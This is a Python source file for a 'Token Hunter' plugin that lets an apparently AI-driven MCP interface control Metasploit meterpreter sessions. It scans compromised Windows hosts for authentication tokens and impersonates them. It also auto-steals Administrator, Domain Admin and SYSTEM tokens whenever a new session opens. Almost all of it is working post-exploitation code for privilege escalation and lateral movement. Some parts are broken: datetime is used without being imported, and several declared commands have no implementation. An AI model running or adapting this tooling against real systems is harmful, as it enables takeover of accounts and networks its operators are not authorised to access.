"""
Token Hunter Plugin for MSF Console MCP
Discovers and manages Windows authentication tokens
"""

import asyncio
import logging
from typing import Any, Dict, List, Optional, Set

from msf_plugin_system import PluginInterface, PluginMetadata, PluginCategory, PluginContext, OperationResult

logger = logging.getLogger(__name__)


class TokenHunterPlugin(PluginInterface):
    """Windows token discovery and manipulation plugin"""
    
    @property
    def metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="token_hunter",
            description="Discover and hunt Windows authentication tokens across sessions",
            category=PluginCategory.POST,
            version="1.0.0",
            author="MSF MCP",
            dependencies=[],
            commands={
                "scan": "Scan sessions for available tokens",
                "list": "List discovered tokens",
                "steal": "Steal/impersonate a token",
                "find_user": "Find tokens for specific user",
                "find_domain": "Find tokens for specific domain",
                "auto_steal": "Automatically steal high-value tokens",
                "export": "Export token information",
                "monitor": "Monitor for new tokens"
            },
            capabilities={"token_discovery", "privilege_escalation", "lateral_movement", "impersonation"},
            auto_load=True,
            priority=75
        )
        
    def __init__(self, context: PluginContext):
        super().__init__(context)
        self._discovered_tokens = {}  # session_id -> [tokens]
        self._stolen_tokens = {}
        self._monitoring = False
        self._target_users = set()
        self._target_domains = set()
        
    async def initialize(self) -> OperationResult:
        """Initialize token hunter plugin"""
        try:
            self._initialized = True
            
            # Register session hooks
            self.register_hook("session_opened", self._on_new_session)
            
            return OperationResult(
                success=True,
                data={"status": "initialized"},
                metadata={"plugin": "token_hunter"}
            )
            
        except Exception as e:
            logger.error(f"Failed to initialize token hunter: {e}")
            return OperationResult(
                success=False,
                data=None,
                error=str(e)
            )
            
    async def cleanup(self) -> OperationResult:
        """Cleanup token hunter plugin"""
        try:
            self._monitoring = False
            
            return OperationResult(
                success=True,
                data={"status": "cleaned_up"},
                metadata={"plugin": "token_hunter"}
            )
            
        except Exception as e:
            logger.error(f"Failed to cleanup token hunter: {e}")
            return OperationResult(
                success=False,
                data=None,
                error=str(e)
            )
            
    async def cmd_scan(self, session_ids: Optional[List[str]] = None, **kwargs) -> OperationResult:
        """Scan sessions for available tokens"""
        try:
            # Get target sessions
            if not session_ids:
                # Get all meterpreter sessions
                sessions_result = await self.msf.execute_command("sessions -l")
                session_ids = self._get_meterpreter_sessions(sessions_result.output)
                
            if not session_ids:
                return OperationResult(
                    success=False,
                    data=None,
                    error="No meterpreter sessions available"
                )
                
            total_tokens = 0
            scan_results = {}
            
            for session_id in session_ids:
                # Load incognito extension
                load_result = await self.msf.execute_command(
                    f"sessions -c 'load incognito' -i {session_id}"
                )
                
                if "Success" in load_result.output or "already loaded" in load_result.output:
                    # List tokens
                    tokens_result = await self.msf.execute_command(
                        f"sessions -c 'list_tokens -u' -i {session_id}"
                    )
                    
                    tokens = self._parse_tokens(tokens_result.output)
                    self._discovered_tokens[session_id] = tokens
                    scan_results[session_id] = len(tokens)
                    total_tokens += len(tokens)
                    
            return OperationResult(
                success=True,
                data={
                    "sessions_scanned": len(session_ids),
                    "total_tokens": total_tokens,
                    "results": scan_results
                },
                metadata={"action": "token_scan"}
            )
            
        except Exception as e:
            logger.error(f"Token scan error: {e}")
            return OperationResult(
                success=False,
                data=None,
                error=str(e)
            )
            
    async def cmd_list(self, session_id: Optional[str] = None, **kwargs) -> OperationResult:
        """List discovered tokens"""
        try:
            if session_id:
                # List tokens for specific session
                tokens = self._discovered_tokens.get(session_id, [])
                
                return OperationResult(
                    success=True,
                    data={
                        "session_id": session_id,
                        "tokens": tokens,
                        "count": len(tokens)
                    },
                    metadata={"action": "token_list"}
                )
            else:
                # List all tokens
                all_tokens = []
                for sid, tokens in self._discovered_tokens.items():
                    for token in tokens:
                        all_tokens.append({
                            "session_id": sid,
                            "token": token
                        })
                        
                return OperationResult(
                    success=True,
                    data={
                        "tokens": all_tokens,
                        "total": len(all_tokens),
                        "sessions": len(self._discovered_tokens)
                    },
                    metadata={"action": "token_list_all"}
                )
                
        except Exception as e:
            logger.error(f"Token list error: {e}")
            return OperationResult(
                success=False,
                data=None,
                error=str(e)
            )
            
    async def cmd_steal(self, session_id: str, token: str, **kwargs) -> OperationResult:
        """Steal/impersonate a token"""
        try:
            # Impersonate token
            cmd = f"sessions -c 'impersonate_token \"{token}\"' -i {session_id}"
            result = await self.msf.execute_command(cmd)
            
            if "Successfully impersonated" in result.output:
                # Verify current user
                whoami_result = await self.msf.execute_command(
                    f"sessions -c 'getuid' -i {session_id}"
                )
                
                self._stolen_tokens[session_id] = {
                    "token": token,
                    "current_user": self._extract_current_user(whoami_result.output),
                    "timestamp": datetime.now().isoformat()
                }
                
                return OperationResult(
                    success=True,
                    data={
                        "session_id": session_id,
                        "token": token,
                        "impersonated": True,
                        "current_user": self._stolen_tokens[session_id]["current_user"]
                    },
                    output=result.output,
                    metadata={"action": "token_steal"}
                )
            else:
                return OperationResult(
                    success=False,
                    data=None,
                    error="Failed to impersonate token",
                    output=result.output
                )
                
        except Exception as e:
            logger.error(f"Token steal error: {e}")
            return OperationResult(
                success=False,
                data=None,
                error=str(e)
            )
            
    async def cmd_find_user(self, username: str, steal: bool = False, **kwargs) -> OperationResult:
        """Find tokens for specific user"""
        try:
            matching_tokens = []
            
            # Search all discovered tokens
            for session_id, tokens in self._discovered_tokens.items():
                for token in tokens:
                    if username.lower() in token["user"].lower():
                        matching_tokens.append({
                            "session_id": session_id,
                            "token": token,
                            "match": "user"
                        })
                        
            if steal and matching_tokens:
                # Auto-steal first matching token
                first_match = matching_tokens[0]
                steal_result = await self.cmd_steal(
                    first_match["session_id"],
                    first_match["token"]["full_name"]
                )
                
                return OperationResult(
                    success=True,
                    data={
                        "found": len(matching_tokens),
                        "matches": matching_tokens,
                        "stolen": steal_result.success
                    },
                    metadata={"action": "find_user", "auto_steal": True}
                )
            else:
                return OperationResult(
                    success=True,
                    data={
                        "found": len(matching_tokens),
                        "matches": matching_tokens
                    },
                    metadata={"action": "find_user"}
                )
                
        except Exception as e:
            logger.error(f"Find user error: {e}")
            return OperationResult(
                success=False,
                data=None,
                error=str(e)
            )
            
    async def cmd_auto_steal(self, priority_users: Optional[List[str]] = None, **kwargs) -> OperationResult:
        """Automatically steal high-value tokens"""
        try:
            high_value_patterns = priority_users or [
                "Administrator", "admin", "Domain Admin",
                "Enterprise Admin", "SYSTEM", "LocalSystem"
            ]
            
            stolen_count = 0
            results = []
            
            for session_id, tokens in self._discovered_tokens.items():
                for token in tokens:
                    token_user = token["user"]
                    
                    # Check if high-value
                    for pattern in high_value_patterns:
                        if pattern.lower() in token_user.lower():
                            # Attempt to steal
                            steal_result = await self.cmd_steal(
                                session_id,
                                token["full_name"]
                            )
                            
                            if steal_result.success:
                                stolen_count += 1
                                results.append({
                                    "session_id": session_id,
                                    "token": token["full_name"],
                                    "pattern": pattern
                                })
                                
                            break  # Don't steal same token multiple times
                            
            return OperationResult(
                success=True,
                data={
                    "stolen_count": stolen_count,
                    "results": results,
                    "high_value_patterns": high_value_patterns
                },
                metadata={"action": "auto_steal"}
            )
            
        except Exception as e:
            logger.error(f"Auto steal error: {e}")
            return OperationResult(
                success=False,
                data=None,
                error=str(e)
            )
            
    async def _on_new_session(self, data: Dict[str, Any]) -> None:
        """Handle new session event"""
        session_id = data.get("session_id")
        session_info = data.get("info", {})
        
        # Only scan meterpreter sessions
        if session_info.get("type") == "meterpreter":
            # Auto-scan for tokens
            await self.cmd_scan(session_ids=[session_id])
            
            # Check for high-value tokens
            if self._monitoring:
                await self.cmd_auto_steal()
                
    def _get_meterpreter_sessions(self, output: str) -> List[str]:
        """Extract meterpreter session IDs"""
        sessions = []
        
        for line in output.split('\n'):
            if 'meterpreter' in line.lower():
                parts = line.split()
                if parts and parts[0].isdigit():
                    sessions.append(parts[0])
                    
        return sessions
        
    def _parse_tokens(self, output: str) -> List[Dict[str, Any]]:
        """Parse tokens from incognito output"""
        tokens = []
        delegation_section = False
        impersonation_section = False
        
        for line in output.split('\n'):
            line = line.strip()
            
            if "Delegation Tokens Available" in line:
                delegation_section = True
                impersonation_section = False
                continue
            elif "Impersonation Tokens Available" in line:
                delegation_section = False
                impersonation_section = True
                continue
            elif not line or "=" in line:
                continue
                
            if (delegation_section or impersonation_section) and '\\' in line:
                tokens.append({
                    "full_name": line.strip(),
                    "domain": line.split('\\')[0],
                    "user": line.split('\\')[1],
                    "type": "delegation" if delegation_section else "impersonation"
                })
                
        return tokens
        
    def _extract_current_user(self, output: str) -> str:
        """Extract current user from getuid output"""
        for line in output.split('\n'):
            if 'Server username:' in line:
                return line.split(':')[1].strip()
                
        return "unknown"